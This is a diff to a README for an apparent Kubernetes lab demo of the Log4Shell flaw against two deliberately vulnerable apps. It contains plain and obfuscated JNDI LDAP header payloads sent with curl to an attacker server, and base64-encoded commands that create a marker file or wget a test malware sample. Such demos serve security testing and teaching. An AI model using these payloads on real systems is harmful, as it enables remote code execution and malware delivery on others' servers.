@@ -12,10 +12,8 @@
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
-Running the Demo
-----------------
-
-kubectl config set-context $(kubectl config current-context) --namespace=dirty-net2
+Running the Demo - KJ
+---------------------
 
 1. Get into the attacking host
 
@@ -31,11 +29,9 @@ curl -v vul-app1:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Comman
 
 Note: The command embedded in the HTTP header is
 
-$ echo 'd2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK' | base64 -d wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/malware-sample
-
-
-
-
+```
+echo 'd2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK' | base64 -d wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/malware-sample
+```
 
 ## Encode with base64 your command
 
@@ -46,36 +42,55 @@ dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==
 
 ## Execute the attack without obfuscation
 
-```console
-curl $(kubectl get svc vul-app1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
-curl $(kubectl get svc vul-app2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
+console
+```
+curl $(kubectl get svc vul-app1 --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
+```
+
+```
+curl $(kubectl get svc vul-app2 --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
 ```
 
 ## Execute the attack with obfuscation
 
-```console
-curl $(kubectl get svc vul-app1-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
-curl $(kubectl get svc vul-app2-frontend --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/dG91Y2ggL3RtcC95b3VIYXZlQmVlblB3bmVkCg==}'
+console
+```
+curl $(kubectl get svc vul-app1 --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
+```
+
+```
+curl $(kubectl get svc vul-app2 --no-headers | awk '{ print $4 }') -H 'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
 ```
 
 ## Confirm that the code execution was successful
 
-```console
+console
+```
 kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- ls -l /tmp
-kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- ls -l /tmp
+```
 
+```
+kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- ls -l /tmp
 ```
 
 ## Connect to runnint pod
 
-```console
+console
+
+```
 kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- sh
+```
+```
 kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- sh
 ```
 
 ## Delete file inside the container
 
-```console
+console
+```
 kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app1) -- rm -f /tmp/youHaveBeenOwned
+```
+
+```
 kubectl exec --stdin --tty $(kubectl get pods -oname | grep vul-app2) -- rm -f /tmp/youHaveBeenOwned
 ```
